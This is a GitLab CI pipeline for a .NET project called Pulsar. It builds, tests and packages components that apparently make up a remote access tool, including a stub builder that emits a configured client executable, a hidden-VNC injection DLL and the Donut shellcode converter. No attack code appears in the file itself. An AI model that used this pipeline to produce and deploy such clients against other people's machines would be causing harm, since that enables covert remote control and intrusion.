stages:
  - managed
  - tests
  - smokes
  - native
  - package

workflow:
  rules:
    - if: '$CI_PIPELINE_SOURCE == "merge_request_event"'
    - if: '$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH'
    - if: '$CI_PIPELINE_SOURCE == "web"'
    - if: '$CI_PIPELINE_SOURCE == "schedule"'
    - when: never

default:
  tags:
    - windows
  interruptible: true
  variables:
    DOTNET_NOLOGO: "true"
    DOTNET_CLI_TELEMETRY_OPTOUT: "true"
    DOTNET_SKIP_FIRST_TIME_EXPERIENCE: "true"
    DOTNET_ROLL_FORWARD: "Major"

managed-builds:
  stage: managed
  parallel:
    matrix:
      - COMPONENT: common
        PROJECT: Pulsar.Common/Pulsar.Common.csproj
      - COMPONENT: client
        PROJECT: Pulsar.Client/Pulsar.Client.csproj
      - COMPONENT: server
        PROJECT: Pulsar.Server/Pulsar.Server.csproj
      - COMPONENT: admin
        PROJECT: Pulsar.AdminClient/Pulsar.AdminClient.csproj
      - COMPONENT: relay
        PROJECT: Pulsar.Relay/Pulsar.Relay.csproj
  script:
    - dotnet restore "$env:PROJECT"
    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
    - dotnet build "$env:PROJECT" --configuration Release --no-restore
    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }

tests:
  stage: tests
  needs:
    - managed-builds
  parallel:
    matrix:
      - FRAMEWORK: net48
        EXPECTED: "54"
      - FRAMEWORK: net9.0-windows
        EXPECTED: "62"
  script:
    - dotnet restore Pulsar.Common.Tests/Pulsar.Common.Tests.csproj
    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
    - dotnet test Pulsar.Common.Tests/Pulsar.Common.Tests.csproj --configuration Release --framework "$env:FRAMEWORK" --no-restore --results-directory TestResults --logger "trx;LogFileName=$($env:FRAMEWORK).trx"
    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
    - |
      $path = Join-Path $PWD "TestResults/$($env:FRAMEWORK).trx"
      if (-not (Test-Path $path)) { throw "Missing test result: $path" }
      [xml] $trx = Get-Content -Raw $path
      $total = [int] $trx.TestRun.ResultSummary.Counters.total
      $passed = [int] $trx.TestRun.ResultSummary.Counters.passed
      $expected = [int] $env:EXPECTED
      if ($total -ne $expected -or $passed -ne $total) {
        throw "Expected $expected passing $($env:FRAMEWORK) tests; observed $passed/$total."
      }
  artifacts:
    when: always
    paths:
      - TestResults
    expire_in: 30 days

contract-checks:
  stage: tests
  needs:
    - managed-builds
  script:
    - dotnet test Pulsar.Common.Tests/Pulsar.Common.Tests.csproj --configuration Release --framework net9.0-windows --filter "FullyQualifiedName~Pulsar.Common.Tests.Build.BuilderCompatibilityTests|FullyQualifiedName~Pulsar.Common.Tests.Messages.MessageHandlerTests" --results-directory TestResults --logger "trx;LogFileName=contracts.trx"
    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
    - |
      [xml] $trx = Get-Content -Raw 'TestResults/contracts.trx'
      $counters = $trx.TestRun.ResultSummary.Counters
      if ([int] $counters.total -ne 18 -or [int] $counters.passed -ne 18) {
        throw "Expected 18 passing contract tests; observed $($counters.passed)/$($counters.total)."
      }
    - |
      $ErrorActionPreference = 'Stop'
      $work = Join-Path $PWD 'ci-builder'
      New-Item -ItemType Directory -Force $work | Out-Null
      $certPath = Join-Path $work 'ci-builder.pfx'
      $cert = New-SelfSignedCertificate `
        -Subject 'CN=Pulsar CI Builder' `
        -CertStoreLocation 'Cert:\CurrentUser\My' `
        -KeyAlgorithm RSA `
        -KeyLength 2048 `
        -KeyExportPolicy Exportable `
        -KeySpec Signature `
        -NotAfter (Get-Date).AddDays(1)
      try {
        Export-PfxCertificate `
          -Cert $cert `
          -FilePath $certPath `
          -Password ([System.Security.SecureString]::new()) | Out-Null
      }
      finally {
        Remove-Item "Cert:\CurrentUser\My\$($cert.Thumbprint)" -ErrorAction SilentlyContinue
      }

      dotnet build Pulsar.Client/Pulsar.Client.csproj --configuration Release
      if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
      $output = Join-Path $work 'client.exe'
      dotnet run `
        --project tools/stub-builder/StubBuilder.csproj `
        --configuration Release `
        -- `
        -hosts '127.0.0.1:4783' `
        -out $output `
        -cert $certPath `
        -template (Join-Path $PWD 'bin/Release/net9.0-windows/client.bin')
      if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }

      $manifestPath = "$output.manifest.json"
      if (-not (Test-Path $manifestPath)) { throw "Builder did not emit $manifestPath." }
      $manifest = Get-Content -Raw $manifestPath | ConvertFrom-Json
      $protocol = ([regex]::Match(
        (Get-Content -Raw 'Pulsar.Common/ProtocolVersion.cs'),
        'Current\s*=\s*"([^"]+)"'
      )).Groups[1].Value
      $expectedHash = (Get-FileHash $output -Algorithm SHA256).Hash
      if ($manifest.ProtocolVersion -ne $protocol) {
        throw "Manifest protocol $($manifest.ProtocolVersion) does not match $protocol."
      }
      if ($manifest.OutputSha256 -ne $expectedHash) {
        throw "Manifest output hash does not match the generated artifact."
      }
      if ($manifest.SettingsLayoutVersion -lt 1 -or [string]::IsNullOrWhiteSpace($manifest.EntryPoint)) {
        throw "Manifest is missing settings-layout or entry-point metadata."
      }
  artifacts:
    when: always
    paths:
      - TestResults
    expire_in: 30 days

web-api-smoke:
  stage: smokes
  needs:
    - tests
    - contract-checks
  script:
    - dotnet run --project tools/webapi-smoke/WebApiSmoke.csproj --configuration Release
    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }

admin-relay-smoke:
  stage: smokes
  needs:
    - tests
    - contract-checks
  script:
    - dotnet build Pulsar.AdminClient/Pulsar.AdminClient.csproj --configuration Debug
    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
    - dotnet run --project tools/admin-relay-smoke/AdminRelaySmoke.csproj --configuration Debug
    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }

native-hvnc:
  stage: native
  needs:
    - web-api-smoke
    - admin-relay-smoke
  script:
    - |
      $solutionDir = "$($PWD.Path)\"
      msbuild HVNCInjection/HVNCInjection.vcxproj /m /p:Configuration=Release /p:Platform=x64 "/p:SolutionDir=$solutionDir"
    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
    - |
      $artifact = 'bin/Release/net9.0-windows/HVNCInjection.x64.dll'
      if (-not (Test-Path $artifact)) { throw "Missing HVNC artifact: $artifact" }
  artifacts:
    paths:
      - bin/Release/net9.0-windows/HVNCInjection.x64.dll
    expire_in: 30 days

native-donut:
  stage: native
  needs:
    - web-api-smoke
    - admin-relay-smoke
  script:
    - dotnet restore Pulsar.Server/Pulsar.Server.csproj
    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
    - dotnet build Pulsar.Server/Pulsar.Server.csproj --configuration ReleaseWithDonut --no-restore
    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
    - |
      foreach ($artifact in @(
        'external/donut/donut.exe',
        'bin/Release/net9.0-windows/donut.exe'
      )) {
        if (-not (Test-Path $artifact)) { throw "Missing Donut artifact: $artifact" }
      }
  artifacts:
    paths:
      - bin/Release/net9.0-windows/donut.exe
    expire_in: 30 days

package:
  stage: package
  needs:
    - job: native-hvnc
      artifacts: true
    - job: native-donut
      artifacts: true
  script:
    - dotnet build Pulsar.Client/Pulsar.Client.csproj --configuration Release
    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
    - dotnet build Pulsar.Server/Pulsar.Server.csproj --configuration Release
    - if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
    - |
      $output = 'bin/Release/net9.0-windows'
      if (-not (Test-Path $output)) { throw "Missing package output: $output" }
      Compress-Archive -Path "$output/*" -DestinationPath build_output.zip -Force
  artifacts:
    paths:
      - build_output.zip
    expire_in: 30 days
    when: on_success
